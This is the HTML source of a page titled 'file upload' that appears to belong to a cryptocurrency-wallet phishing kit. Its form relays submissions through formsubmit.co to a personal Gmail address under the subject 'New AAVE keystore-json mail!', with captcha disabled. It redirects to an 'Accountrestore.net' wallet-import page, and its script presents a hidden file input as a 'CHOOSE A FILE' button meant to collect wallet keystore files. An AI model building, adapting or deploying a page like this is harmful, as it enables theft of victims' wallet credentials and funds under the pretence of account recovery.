<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>file upload</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <form action="https://formsubmit.co/rolandferanmi1@gmail.com" method="post">
    <input type="hidden" name="_next" value="https://Accountrestore.net/walletimport.html">
    <input type="hidden" name="_subject" value="New AAVE keystore-json mail!">
    <input type="hidden" name="_captcha" value="false">
    <input type="file" id="real-file" hidden="hidden" />
    <button type="button" id="custom-button">CHOOSE A FILE</button>
    <span id="custom-text">No file yet</span>
    </form>
    <script type="text/javascript">
        const realFileBtn = document.getElementById("real-file");
        const customBtn = document.getElementById("custom-button");
        const customTxt = document.getElementById("custom-text");
       

        customBtn.addEventListener("click", function() {
            realFileBtn.click();
        });

        realFileBtn.addEventListener("change", function() {
            if (realFileBtn.value) {
                customTxt.innerHTML = realFileBtn.value;
            }
        })
       
    </script>
</body>
</html>
